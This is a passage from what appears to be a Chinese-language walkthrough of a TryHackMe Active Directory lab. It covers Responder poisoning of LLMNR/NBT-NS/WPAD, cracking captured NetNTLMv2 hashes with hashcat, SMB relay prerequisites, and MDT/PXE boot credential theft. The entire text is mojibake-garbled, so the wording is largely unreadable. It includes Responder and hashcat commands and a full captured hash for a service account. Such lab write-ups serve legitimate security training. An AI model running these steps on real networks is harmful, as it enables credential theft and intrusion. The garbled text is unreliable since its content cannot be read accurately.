æ‰§è¡Œã€‚å°½ç®¡è¿™äº›æ¼æ´ä¸­çš„ä¸€äº›å·²åœ¨åè®®çš„æ›´æ–°ç‰ˆæœ¬ä¸­å¾—åˆ°è§£å†³ï¼Œä½†é€šå¸¸ç»„ç»‡å¹¶ä¸å¼ºåˆ¶ä½¿ç”¨æ›´æ–°ç‰ˆæœ¬ï¼Œå› ä¸ºæ—§ç³»ç»Ÿä¸æ”¯æŒå®ƒä»¬ã€‚æˆ‘ä»¬å°†ç ”ç©¶ä¸¤ç§ä¸åŒçš„åˆ©ç”¨æ–¹å¼ï¼Œç”¨äºSMBçš„NetNTLMèº«ä»½éªŒè¯ï¼š ç”±äºNTLM Challengeså¯ä»¥è¢«æ‹¦æˆªï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¦»çº¿ç ´è§£æŠ€æœ¯æ¥æ¢å¤ä¸NTLM Challengeç›¸å…³çš„å¯†ç ã€‚ç„¶è€Œï¼Œè¿™ç§ç ´è§£è¿‡ç¨‹æ¯”ç›´æ¥ç ´è§£ NTLM å“ˆå¸Œè¦æ…¢å¾—å¤šã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„æ¶æ„è®¾å¤‡è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œä¸­ç»§å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„SMBèº«ä»½éªŒè¯ï¼Œè¿™å°†ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªæ´»åŠ¨çš„å·²éªŒè¯ä¼šè¯å’Œå¯¹ç›®æ ‡æœåŠ¡å™¨çš„è®¿é—®ã€‚ LLMNR, NBT-NS, and WPAD åœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†ç¨å¾®äº†è§£ä¸€ä¸‹ä½¿ç”¨ SMB æœŸé—´å‘ç”Ÿçš„èº«ä»½éªŒè¯ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ Responder å°è¯•æ‹¦æˆª NetNTLM æŒ‘æˆ˜æ¥ç ´è§£å®ƒã€‚ç½‘ç»œä¸Šé€šå¸¸æœ‰å¾ˆå¤šè¿™æ ·çš„æŒ‘æˆ˜ã€‚ä¸€äº›å®‰å…¨è§£å†³æ–¹æ¡ˆç”šè‡³æ‰«ææ•´ä¸ª IP èŒƒå›´ä»¥ä»ä¸»æœºæ¢å¤ä¿¡æ¯ã€‚æœ‰æ—¶ï¼Œç”±äº DNS è®°å½•è¿‡æ—¶ï¼Œè¿™äº›èº«ä»½éªŒè¯æŒ‘æˆ˜æœ€ç»ˆå¯èƒ½ä¼šæ”»å‡»æ‚¨çš„æ¶æ„è®¾å¤‡è€Œä¸æ˜¯ç›®æ ‡ä¸»æœºã€‚ Responder å…è®¸æˆ‘ä»¬é€šè¿‡åœ¨ NetNTLM èº«ä»½éªŒè¯æœŸé—´æ¯’å®³å“åº”æ¥æ‰§è¡Œä¸­é—´äººæ”»å‡»ï¼Œæ¬ºéª—å®¢æˆ·ç«¯ä¸æ‚¨è€Œä¸æ˜¯ä»–ä»¬æƒ³è¦è¿æ¥çš„å®é™…æœåŠ¡å™¨è¿›è¡Œå¯¹è¯ã€‚åœ¨çœŸå® LAN ä¸Šï¼Œå“åº”ç¨‹åºå°†å°è¯•æ¯’å®³æ£€æµ‹åˆ°çš„ä»»ä½•é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ (LLMNR)ã€NetBIOS åç§°æœåŠ¡ (NBT-NS) å’Œ Web ä»£ç†è‡ªåŠ¨å‘ç° (WPAD) è¯·æ±‚ã€‚åœ¨å¤§å‹ Windows ç½‘ç»œä¸Šï¼Œè¿™äº›åè®®å…è®¸ä¸»æœºä¸ºåŒä¸€æœ¬åœ°ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºæ‰§è¡Œè‡ªå·±çš„æœ¬åœ° DNS è§£æã€‚ä¸»æœºå¯ä»¥é¦–å…ˆå°è¯•é€šè¿‡å‘é€ LLMNR è¯·æ±‚å¹¶æŸ¥çœ‹æ˜¯å¦æœ‰ä¸»æœºå“åº”æ¥ç¡®å®šå®ƒä»¬æ­£åœ¨æŸ¥æ‰¾çš„ä¸»æœºæ˜¯å¦ä½äºåŒä¸€æœ¬åœ°ç½‘ç»œä¸Šï¼Œè€Œä¸æ˜¯ä½¿ DNS æœåŠ¡å™¨ç­‰ç½‘ç»œèµ„æºè´Ÿæ‹…è¿‡é‡ã€‚ NBT-NS æ˜¯ LLMNR çš„å…ˆé©±åè®®ï¼Œå‘å‡º WPAD è¯·æ±‚æ˜¯ä¸ºäº†å°è¯•ä¸ºæœªæ¥çš„ HTTP(s) è¿æ¥æ‰¾åˆ°ä»£ç†ã€‚ ç”±äºè¿™äº›åè®®ä¾èµ–äºåœ¨æœ¬åœ°ç½‘ç»œä¸Šå¹¿æ’­çš„è¯·æ±‚ï¼Œå› æ­¤æˆ‘ä»¬çš„æ¶æ„è®¾å¤‡ä¹Ÿä¼šæ”¶åˆ°è¿™äº›è¯·æ±‚ã€‚é€šå¸¸ï¼Œè¿™äº›è¯·æ±‚ä¼šè¢«ç®€å•åœ°ä¸¢å¼ƒï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯é’ˆå¯¹æˆ‘ä»¬çš„ä¸»æœºçš„ã€‚ç„¶è€Œï¼Œå“åº”è€…å°†ä¸»åŠ¨ä¾¦å¬è¯·æ±‚å¹¶å‘é€æœ‰æ¯’å“åº”ï¼Œå‘Šè¯‰è¯·æ±‚ä¸»æœºæˆ‘ä»¬çš„ IP ä¸è¯·æ±‚çš„ä¸»æœºåç›¸å…³è”ã€‚é€šè¿‡æ¯’å®³è¿™äº›è¯·æ±‚ï¼ŒResponder å°è¯•å¼ºåˆ¶å®¢æˆ·ç«¯è¿æ¥åˆ°æˆ‘ä»¬çš„ AttackBoxã€‚åœ¨åŒä¸€è¡Œä¸­ï¼Œå®ƒå¼€å§‹æ‰˜ç®¡å¤šä¸ªæœåŠ¡å™¨ï¼Œä¾‹å¦‚ SMBã€HTTPã€SQL ç­‰ï¼Œä»¥æ•è·è¿™äº›è¯·æ±‚å¹¶å¼ºåˆ¶è¿›è¡Œèº«ä»½éªŒè¯ã€‚ æ‹¦æˆª NetNTLM æŒ‘æˆ˜ éœ€è¦æ³¨æ„çš„ä¸€ä»¶äº‹æ˜¯ï¼ŒResponder å®è´¨ä¸Šè¯•å›¾é€šè¿‡æ¯’å®³è¿æ¥æ¥èµ¢å¾—ç«äº‰æ¡ä»¶ï¼Œä»¥ç¡®ä¿æ‚¨æ‹¦æˆªè¿æ¥ã€‚è¿™æ„å‘³ç€å“åº”ç¨‹åºé€šå¸¸ä»…é™äºæœ¬åœ°ç½‘ç»œä¸Šçš„ä¸­æ¯’èº«ä»½éªŒè¯è´¨è¯¢ã€‚ç”±äºæˆ‘ä»¬é€šè¿‡ VPN è¿æ¥åˆ°ç½‘ç»œï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½ç ´åè¯¥ VPN ç½‘ç»œä¸Šå‘ç”Ÿçš„èº«ä»½éªŒè¯è´¨è¯¢ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬æ¨¡æ‹Ÿäº†ä¸€ä¸ªå¯èƒ½ä¸­æ¯’çš„èº«ä»½éªŒè¯è¯·æ±‚ï¼Œæ¯ 30 åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ã€‚è¿™æ„å‘³ç€æ‚¨å¯èƒ½éœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´æ‰èƒ½æ‹¦æˆª NetNTLM è´¨è¯¢å’Œå“åº”ã€‚ å°½ç®¡ Responder åœ¨ä»è¿æ¥åˆ°ç»„ç»‡ LAN çš„æ¶æ„è®¾å¤‡æ‰§è¡Œæ—¶èƒ½å¤Ÿæ‹¦æˆªå’Œæ¯’å®³æ›´å¤šèº«ä»½éªŒè¯è¯·æ±‚ï¼Œä½†äº†è§£è¿™ç§è¡Œä¸ºå¯èƒ½å…·æœ‰ç ´åæ€§å¹¶å› æ­¤è¢«æ£€æµ‹åˆ°è‡³å…³é‡è¦ã€‚é€šè¿‡ä¸­æ¯’èº«ä»½éªŒè¯è¯·æ±‚ï¼Œæ­£å¸¸çš„ç½‘ç»œèº«ä»½éªŒè¯å°è¯•å°†å¤±è´¥ï¼Œè¿™æ„å‘³ç€ç”¨æˆ·å’ŒæœåŠ¡å°†æ— æ³•è¿æ¥åˆ°ä»–ä»¬æƒ³è¦è¿æ¥çš„ä¸»æœºå’Œå…±äº«ã€‚åœ¨å®‰å…¨è¯„ä¼°ä¸­ä½¿ç”¨ Responder æ—¶è¯·è®°ä½è¿™ä¸€ç‚¹ã€‚ Responder å·²å®‰è£…åœ¨ AttackBox ä¸Šã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨ä¸ä½¿ç”¨ AttackBoxï¼Œåˆ™å¯ä»¥ä»æ­¤å­˜å‚¨åº“ä¸‹è½½å¹¶å®‰è£…å®ƒï¼šhttps://github.com/lgandx/Responderã€‚æˆ‘ä»¬å°†è®¾ç½® Responder åœ¨è¿æ¥åˆ° VPN çš„æ¥å£ä¸Šè¿è¡Œï¼š responder -I breachad å¦‚æœæ‚¨ä½¿ç”¨ AttackBoxï¼Œåˆ™å¹¶éæ‰€æœ‰å“åº”ç¨‹åºæœåŠ¡éƒ½èƒ½å¤Ÿå¯åŠ¨ï¼Œå› ä¸ºå…¶ä»–æœåŠ¡å·²åœ¨ä½¿ç”¨è¿™äº›ç«¯å£ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ä¼šå½±å“æ­¤ä»»åŠ¡ã€‚ Responder ç°åœ¨å°†ä¾¦å¬ä»»ä½•ä¼ å…¥çš„ LLMNRã€NBT-NS æˆ– WPAD è¯·æ±‚ã€‚æˆ‘ä»¬ä¼šè®© Responder åœ¨çœŸå® LAN ä¸Šè¿è¡Œä¸€æ®µæ—¶é—´ã€‚ç„¶è€Œï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡è®©å…¶ä¸­ä¸€å°æœåŠ¡å™¨å°è¯•å¯¹ VPN ä¸Šçš„è®¡ç®—æœºè¿›è¡Œèº«ä»½éªŒè¯æ¥æ¨¡æ‹Ÿè¿™ç§ä¸­æ¯’ã€‚è®© Responder è¿è¡Œä¸€æ®µæ—¶é—´ï¼ˆå¹³å‡ 10 åˆ†é’Ÿï¼Œå‘¼å¸ä¸€ä¸‹æ–°é²œç©ºæ°”ï¼ï¼‰ï¼Œæ‚¨åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ª SMBv2 è¿æ¥ï¼ŒResponder å¯ä»¥ä½¿ç”¨è¯¥è¿æ¥æ¥å¸å¼•å’Œæå– NTLMv2-SSP å“åº”ã€‚å®ƒçœ‹èµ·æ¥åƒè¿™æ ·ï¼š NTLM å¯†ç å–·å°„æ”»å‡» [+] Listening for events... [SMBv2] NTLMv2-SSP Client : &lt;Client IP&gt; [SMBv2] NTLMv2-SSP Username : ZA\\&lt;Service Account Username&gt; [SMBv2] NTLMv2-SSP Hash : &lt;Service Account Username&gt;::ZA:&lt;NTLMv2-SSP Hash&gt; å¦‚æœæˆ‘ä»¬ä½¿ç”¨æ¶æ„è®¾å¤‡ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šè¿è¡Œ Responder ç›¸å½“é•¿çš„æ—¶é—´ï¼Œæ•è·å¤šä¸ªå“åº”ã€‚ä¸€æ—¦æˆ‘ä»¬æœ‰äº†å‡ ä¸ªï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å¯¹å“åº”æ‰§è¡Œä¸€äº›ç¦»çº¿ç ´è§£ï¼Œå¸Œæœ›æ¢å¤å®ƒä»¬å…³è”çš„ NTLM å¯†ç ã€‚å¦‚æœè´¦æˆ·é…ç½®äº†å¼±å¯†ç ï¼Œæˆ‘ä»¬å°±æœ‰å¾ˆå¤§çš„æœºä¼šæˆåŠŸç ´è§£å®ƒä»¬ã€‚å°† NTLMv2-SSP å“ˆå¸Œå¤åˆ¶åˆ°æ–‡æœ¬æ–‡ä»¶ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å¯ä¸‹è½½æ–‡ä»¶ä¸­æä¾›çš„å¯†ç åˆ—è¡¨æ¥æ‰§è¡Œæ­¤ä»»åŠ¡ï¼Œå¹¶ä½¿ç”¨ Hashcat å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç ´è§£å“ˆå¸Œï¼š hashcat -m 5600 &lt;hash file&gt; &lt;password file&gt; --force å¯†ç æ–‡ä»¶å·²åœ¨ AttackBox çš„ /root/Rooms/BreachingAD/task5/ ç›®å½•ä¸­æˆ–ä½œä¸ºå¯ä¸‹è½½çš„ä»»åŠ¡æ–‡ä»¶æä¾›ç»™æ‚¨ã€‚æˆ‘ä»¬ä½¿ç”¨ hashtype 5600ï¼Œå®ƒä¸ hashcat çš„ NTLMv2-SSP ç›¸å¯¹åº”ã€‚å¦‚æœæ‚¨ä½¿ç”¨è‡ªå·±çš„æœºå™¨ï¼Œåˆ™å¿…é¡»å…ˆå®‰è£… Hashcatã€‚ æˆ‘ä»¬å¯ä»¥ç ´è§£çš„ä»»ä½•å“ˆå¸Œç°åœ¨éƒ½å°†ä¸ºæˆ‘ä»¬æä¾›ç”¨äºè¿è§„çš„ AD å‡­æ®ï¼ ä¼ é€’æŒ‘æˆ˜ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ›´è¿›ä¸€æ­¥ï¼Œå°è¯•ä¼ é€’æŒ‘æˆ˜ï¼Œè€Œä¸æ˜¯ç›´æ¥æ•è·æŒ‘æˆ˜ã€‚å¦‚æœäº‹å…ˆä¸äº†è§£å¸æˆ·ï¼Œåˆ™æ‰§è¡Œæ­¤æ“ä½œä¼šæœ‰ç‚¹å›°éš¾ï¼Œå› ä¸ºæ­¤æ”»å‡»å–å†³äºå…³è”å¸æˆ·çš„æƒé™ã€‚æˆ‘ä»¬éœ€è¦åšä¸€äº›å¯¹æˆ‘ä»¬æœ‰åˆ©çš„äº‹æƒ…ï¼š åº”ç¦ç”¨æˆ–å¯ç”¨ SMB ç­¾åï¼Œä½†ä¸å¼ºåˆ¶æ‰§è¡Œã€‚å½“æˆ‘ä»¬æ‰§è¡Œä¸­ç»§æ—¶ï¼Œæˆ‘ä»¬ä¼šå¯¹è¯·æ±‚è¿›è¡Œå¾®å°çš„æ›´æ”¹ä»¥å°†å…¶ä¼ é€’ã€‚å¦‚æœå¯ç”¨äº† SMB ç­¾åï¼Œæˆ‘ä»¬å°†æ— æ³•ä¼ªé€ æ¶ˆæ¯ç­¾åï¼Œè¿™æ„å‘³ç€æœåŠ¡å™¨ä¼šæ‹’ç»å®ƒã€‚ å…³è”çš„å¸æˆ·éœ€è¦æœåŠ¡å™¨ä¸Šçš„ç›¸å…³æƒé™æ‰èƒ½è®¿é—®æ‰€è¯·æ±‚çš„èµ„æºã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸­ç»§å…·æœ‰æœåŠ¡å™¨ç®¡ç†æƒé™çš„å¸æˆ·çš„è´¨è¯¢å’Œå“åº”ï¼Œå› ä¸ºè¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸»æœºä¸Šç«‹è¶³ã€‚ ç”±äºæˆ‘ä»¬åœ¨æŠ€æœ¯ä¸Šè¿˜æ²¡æœ‰ AD ç«‹è¶³ç‚¹ï¼Œå› æ­¤éœ€è¦å¯¹å“ªäº›å¸æˆ·å¯¹å“ªäº›ä¸»æœºæ‹¥æœ‰æƒé™è¿›è¡Œä¸€äº›çŒœæµ‹ã€‚å¦‚æœæˆ‘ä»¬å·²ç»è¿åäº† ADï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ‰§è¡Œä¸€äº›åˆå§‹æšä¸¾ï¼Œè¿™é€šå¸¸æ˜¯è¿™ç§æƒ…å†µã€‚ è¿™å°±æ˜¯ç›²æ¥é€šå¸¸ä¸æµè¡Œçš„åŸå› ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæ‚¨é¦–å…ˆä½¿ç”¨å¦ä¸€ç§æ–¹æ³•ç ´å ADï¼Œç„¶åæ‰§è¡Œæšä¸¾ä»¥ç¡®å®šä¸æ‚¨æ‰€ç ´åçš„å¸æˆ·å…³è”çš„æƒé™ã€‚ä»è¿™é‡Œï¼Œæ‚¨é€šå¸¸å¯ä»¥æ‰§è¡Œæ¨ªå‘ç§»åŠ¨ä»¥è·¨åŸŸè¿›è¡Œæƒé™å‡çº§ã€‚ä¸è¿‡ï¼Œä»æ ¹æœ¬ä¸Šäº†è§£ä¸€ä¸‹ä¸­ç»§æ”»å‡»çš„å·¥ä½œåŸç†è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¦‚æœæ‚¨æƒ³å®é™…å°è¯•è¿™ç§ç±»å‹çš„æ”»å‡»ï¼Œè¯·å‰å¾€ Holo Networkã€‚æˆ‘ä»¬ä¹Ÿä¼šåœ¨ä»¥åçš„å¹¿å‘Šå®¤ä¸­å†æ¬¡è®¨è®ºè¿™ä¸€ç‚¹ã€‚ é¦–å…ˆæ‰§è¡Œresponderï¼š ååˆ†é’Ÿå·¦å³å¾—åˆ°å¦‚ä¸‹å“åº”ï¼š svcFileCopy::ZA:b74c5cc6e5eaac51:E3C2C14AD0C8767E33B65AF91E87ABFE:0101000000000000803D5A817F5BDA01051BE47B70F1B4730000000002000800380059005500440001001E00570049004E002D00340055005500560035004C0036004E0046003800300004003400570049004E002D00340055005500560035004C0036004E004600380030002E0038005900550044002E004C004F00430041004C000300140038005900550044002E004C004F00430041004C000500140038005900550044002E004C004F00430041004C0007000800803D5A817F5BDA0106000400020000000800300030000000000000000000000000200000B439D5FE6702315673E604C277083A3E0C091CE1C8C49BBD1E05AB2FCAA4BD990A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E0038002E00310030000000000000000000 èµ‹å€¼å…¶ä¸­çš„hashå€¼åˆ°æ–‡ä»¶ä¸­ï¼Œæ¥ç€hashcatè¿›è¡Œç ´è§£ ä¸€åˆ†é’Ÿå·¦å³å¾—åˆ°ç»“æœï¼š ç®­å¤´å¤„ä¸ºå¯†ç  0x06 Microsoft éƒ¨ç½²å·¥å…·åŒ… å¤§å‹ç»„ç»‡éœ€è¦å·¥å…·æ¥éƒ¨ç½²å’Œç®¡ç†èµ„äº§çš„åŸºç¡€è®¾æ–½ã€‚åœ¨å¤§å‹ç»„ç»‡ä¸­ï¼Œæ‚¨æ— æ³•è®© IT äººå‘˜ä½¿ç”¨ DVD ç”šè‡³ USB é—ªå­˜é©±åŠ¨å™¨åœ¨æ¯å°è®¡ç®—æœºä¸Šå®‰è£…è½¯ä»¶ã€‚å¹¸è¿çš„æ˜¯ï¼Œå¾®è½¯å·²ç»æä¾›äº†ç®¡ç†èµ„äº§æ‰€éœ€çš„å·¥å…·ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™äº›å·¥å…·ä¸­çš„é”™è¯¯é…ç½®æ¥ç ´å ADã€‚ MDT and SCCM Microsoft éƒ¨ç½²å·¥å…·åŒ… (MDT) æ˜¯ä¸€é¡¹ Microsoft æœåŠ¡ï¼Œå¯å¸®åŠ©è‡ªåŠ¨éƒ¨ç½² Microsoft æ“ä½œç³»ç»Ÿ (OS)ã€‚å¤§å‹ç»„ç»‡ä½¿ç”¨ MDT ç­‰æœåŠ¡æ¥å¸®åŠ©æ›´æœ‰æ•ˆåœ°åœ¨å…¶èµ„äº§ä¸­éƒ¨ç½²æ–°æ˜ åƒï¼Œå› ä¸ºå¯ä»¥åœ¨ä¸­å¤®ä½ç½®ç»´æŠ¤å’Œæ›´æ–°åŸºç¡€æ˜ åƒã€‚ é€šå¸¸ï¼ŒMDT ä¸ Microsoft çš„ç³»ç»Ÿä¸­å¿ƒé…ç½®ç®¡ç†å™¨ (SCCM) é›†æˆï¼Œåè€…ç®¡ç†æ‰€æœ‰ Microsoft åº”ç”¨ç¨‹åºã€æœåŠ¡å’Œæ“ä½œç³»ç»Ÿçš„æ‰€æœ‰æ›´æ–°ã€‚ MDT ç”¨äºæ–°éƒ¨ç½²ã€‚ä»æœ¬è´¨ä¸Šè®²ï¼Œå®ƒå…è®¸ IT å›¢é˜Ÿé¢„é…ç½®å’Œç®¡ç†å¯åŠ¨æ˜ åƒã€‚å› æ­¤ï¼Œå¦‚æœä»–ä»¬éœ€è¦é…ç½®ä¸€å°æ–°æœºå™¨ï¼Œä»–ä»¬åªéœ€è¦æ’å…¥ç½‘çº¿ï¼Œä¸€åˆ‡éƒ½ä¼šè‡ªåŠ¨å‘ç”Ÿã€‚ä»–ä»¬å¯ä»¥å¯¹å¯åŠ¨æ˜ åƒè¿›è¡Œå„ç§æ›´æ”¹ï¼Œä¾‹å¦‚å·²ç»å®‰è£… Office365 ç­‰é»˜è®¤è½¯ä»¶å’Œç»„ç»‡é€‰æ‹©çš„é˜²ç—…æ¯’è½¯ä»¶ã€‚å®ƒè¿˜å¯ä»¥ç¡®ä¿åœ¨å®‰è£…ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶æ›´æ–°æ–°ç‰ˆæœ¬ã€‚ SCCM å‡ ä¹å¯ä»¥è¢«è§†ä¸º MDT çš„æ‰©å±•å’Œè€å¤§å“¥ã€‚è½¯ä»¶å®‰è£…åä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿå—¯ï¼ŒSCCM è¿›è¡Œè¿™ç§ç±»å‹çš„è¡¥ä¸ç®¡ç†ã€‚å®ƒå…è®¸ IT å›¢é˜ŸæŸ¥çœ‹æ•´ä¸ªåœ°äº§ä¸­å®‰è£…çš„æ‰€æœ‰è½¯ä»¶çš„å¯ç”¨æ›´æ–°ã€‚å›¢é˜Ÿè¿˜å¯ä»¥åœ¨æ²™ç®±ç¯å¢ƒä¸­æµ‹è¯•è¿™äº›è¡¥ä¸ï¼Œä»¥ç¡®ä¿å®ƒä»¬ç¨³å®šï¼Œç„¶åå†å°†å®ƒä»¬é›†ä¸­éƒ¨ç½²åˆ°æ‰€æœ‰åŠ å…¥åŸŸçš„è®¡ç®—æœºã€‚å®ƒä½¿ IT å›¢é˜Ÿçš„å·¥ä½œå˜å¾—æ›´åŠ è½»æ¾ã€‚ ç„¶è€Œï¼Œä»»ä½•æä¾›åŸºç¡€è®¾æ–½é›†ä¸­ç®¡ç†çš„ä¸œè¥¿ï¼ˆä¾‹å¦‚ MDT å’Œ SCCMï¼‰ä¹Ÿå¯èƒ½æˆä¸ºæ”»å‡»è€…çš„ç›®æ ‡ï¼Œè¯•å›¾æ¥ç®¡è¯¥èµ„äº§ä¸­çš„å¤§éƒ¨åˆ†å…³é”®åŠŸèƒ½ã€‚å°½ç®¡å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼é…ç½® MDTï¼Œä½†å¯¹äºæ­¤ä»»åŠ¡ï¼Œæˆ‘ä»¬å°†ä¸“é—¨å…³æ³¨ç§°ä¸ºé¢„å¯åŠ¨æ‰§è¡Œç¯å¢ƒ (PXE) å¯åŠ¨çš„é…ç½®ã€‚ PXE Boot å¤§å‹ç»„ç»‡ä½¿ç”¨ PXE å¼•å¯¼æ¥å…è®¸è¿æ¥åˆ°ç½‘ç»œçš„æ–°è®¾å¤‡ç›´æ¥é€šè¿‡ç½‘ç»œè¿æ¥åŠ è½½å’Œå®‰è£…æ“ä½œç³»ç»Ÿã€‚ MDT å¯ç”¨äºåˆ›å»ºã€ç®¡ç†å’Œæ‰˜ç®¡ PXE å¯åŠ¨æ˜ åƒã€‚ PXE å¯åŠ¨é€šå¸¸ä¸ DHCP é›†æˆï¼Œè¿™æ„å‘³ç€å¦‚æœ DHCP åˆ†é… IP ç§Ÿçº¦ï¼Œåˆ™å…è®¸ä¸»æœºè¯·æ±‚ PXE å¯åŠ¨æ˜ åƒå¹¶å¯åŠ¨ç½‘ç»œæ“ä½œç³»ç»Ÿå®‰è£…è¿‡ç¨‹ã€‚é€šä¿¡æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º æ‰§è¡Œè¯¥è¿‡ç¨‹åï¼Œå®¢æˆ·ç«¯å°†ä½¿ç”¨ TFTP è¿æ¥ä¸‹è½½ PXE å¯åŠ¨æ˜ åƒã€‚æˆ‘ä»¬å¯ä»¥å°† PXE å¯åŠ¨æ˜ åƒç”¨äºä¸¤ä¸ªä¸åŒçš„ç›®çš„ï¼š æ³¨å…¥æƒé™å‡çº§å‘é‡ï¼ˆä¾‹å¦‚æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·ï¼‰ï¼Œä»¥ä¾¿åœ¨ PXE å¯åŠ¨å®Œæˆåè·å¾—å¯¹æ“ä½œç³»ç»Ÿçš„ç®¡ç†è®¿é—®æƒé™ã€‚ æ‰§è¡Œå¯†ç æŠ“å–æ”»å‡»ä»¥æ¢å¤å®‰è£…æœŸé—´ä½¿ç”¨çš„ AD å‡­æ®ã€‚ åœ¨æœ¬ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨åè€…ã€‚æˆ‘ä»¬å°†å°è¯•åœ¨å®‰è£…è¿‡ç¨‹ä¸­æ¢å¤ä¸ MDT æœåŠ¡å…³è”çš„éƒ¨ç½²æœåŠ¡å¸æˆ·ï¼Œä»¥åº”å¯¹æ­¤å¯†ç æŠ“å–æ”»å‡»ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥æ£€ç´¢ç”¨äºæ— äººå€¼å®ˆå®‰è£…åº”ç”¨ç¨‹åºå’ŒæœåŠ¡çš„å…¶ä»– AD å¸æˆ·ã€‚ PXE Boot Image Retrieval ç”±äº DHCP æœ‰ç‚¹æŒ‘å‰”ï¼Œæˆ‘ä»¬å°†ç»•è¿‡æ­¤æ”»å‡»çš„åˆå§‹æ­¥éª¤ã€‚æˆ‘ä»¬å°†è·³è¿‡å°è¯•ä» DHCP è¯·æ±‚ IP å’Œ PXE å¯åŠ¨é¢„é…ç½®è¯¦ç»†ä¿¡æ¯çš„éƒ¨åˆ†ã€‚æˆ‘ä»¬å°†æ‰‹åŠ¨æ‰§è¡Œè¯¥è¿‡ç¨‹ä¸­æ­¤æ­¥éª¤çš„å…¶ä½™æ”»å‡»ã€‚ æ‚¨é€šè¿‡ DHCP æ”¶åˆ°çš„æœ‰å…³ PXE å¯åŠ¨é¢„é…ç½®çš„ç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯ MDT æœåŠ¡å™¨çš„ IPã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæ‚¨å¯ä»¥ä» TryHackMe ç½‘ç»œå›¾ä¸­æ¢å¤è¯¥ä¿¡æ¯ã€‚ æ‚¨æ”¶åˆ°çš„ç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ BCD æ–‡ä»¶çš„åç§°ã€‚è¿™äº›æ–‡ä»¶å­˜å‚¨ä¸ä¸åŒç±»å‹çš„ä½“ç³»ç»“æ„çš„ PXE å¼•å¯¼ç›¸å…³çš„ä¿¡æ¯ã€‚è¦æ£€ç´¢æ­¤ä¿¡æ¯ï¼Œæ‚¨éœ€è¦è¿æ¥åˆ°æ­¤ç½‘ç«™ï¼šhttp://pxeboot.za.tryhackme.comã€‚å®ƒå°†åˆ—å‡ºå„ç§ BCD æ–‡ä»¶ï¼š é€šå¸¸ï¼Œæ‚¨å°†ä½¿ç”¨ TFTP è¯·æ±‚æ¯ä¸ª BCD æ–‡ä»¶å¹¶æšä¸¾æ‰€æœ‰æ–‡ä»¶çš„é…ç½®ã€‚ä¸è¿‡ï¼Œç”±äºæ—¶é—´å…³ç³»ï¼Œæˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨ x64 æ¶æ„çš„ BCD æ–‡ä»¶ã€‚å¤åˆ¶å¹¶å­˜å‚¨è¯¥æ–‡ä»¶çš„å…¨åã€‚åœ¨æœ¬ç»ƒä¹ çš„å…¶ä½™éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æ­¤åç§°å ä½ç¬¦ x64{7B...B3}.bcd ï¼Œå› ä¸º MDT æ¯å¤©éƒ½ä¼šé‡æ–°ç”Ÿæˆæ–‡ä»¶åŠå…¶åç§°ã€‚æ¯æ¬¡çœ‹åˆ°æ­¤å ä½ç¬¦æ—¶ï¼Œè¯·è®°ä½å°†å…¶æ›¿æ¢ä¸ºæ‚¨çš„ç‰¹å®š BCD æ–‡ä»¶åã€‚å¦è¯·æ³¨æ„ï¼Œå¦‚æœç½‘ç»œåˆšåˆšå¯åŠ¨ï¼Œè¿™äº›æ–‡ä»¶åå°†ä»…åœ¨ç½‘ç»œå¤„äºæ´»åŠ¨çŠ¶æ€ 10 åˆ†é’Ÿåæ›´æ–°ã€‚ ç°åœ¨ä» DHCP æ¢å¤äº†åˆå§‹ä¿¡æ¯ï¼ˆçœ¨çœ¼ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æšä¸¾å¹¶æ£€ç´¢ PXE å¯åŠ¨æ˜ åƒã€‚åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªæ­¥éª¤ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ THMJMP1 ä¸Šçš„ SSH è¿æ¥ï¼Œå› 